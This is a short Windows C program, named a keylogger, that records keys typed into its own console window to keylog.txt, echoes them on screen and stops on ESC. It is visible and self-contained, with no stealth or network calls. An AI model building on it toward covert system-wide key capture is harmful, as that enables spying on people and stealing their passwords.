#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <windows.h>

void log_key(char key) {

    FILE *file = fopen("keylog.txt", "a");

    if (file == NULL) {
        printf("Error opening file!\n");
        exit(1);
    }


    if (key == '\b') {
        fprintf(file, "[BACKSPACE]");
        printf("[BACKSPACE]");
    } else if (key == '\r') {
        fprintf(file, "\n");
        printf("\n");
    } else if (key == '\t') {
        fprintf(file, "[TAB]");
        printf("[TAB]");
    } else {
        fprintf(file, "%c", key);
        printf("%c", key);
    }

    fclose(file);
}

void clear_log_file() {
    FILE *file = fopen("keylog.txt", "w");

    if (file == NULL) {
        printf("Error opening file!\n");
        exit(1);
    }

    fclose(file);
    printf("\nKeylog file has been cleared!\n");
}

int main() {
    char key;

    printf("Press 'ESC' to stop the keylogger.\n");
    printf("Press 'Ctrl+D' to clear the keylog file.\n");

    while (1) {
        if (_kbhit()) {
            key = _getch();

            if (key == 27) {
                printf("\nExiting keylogger...\n");
                break;
            }

            if (key == 4) {
                clear_log_file();
                continue;
            }

            log_key(key);
        }

        Sleep(50);
    }

    return 0;
}



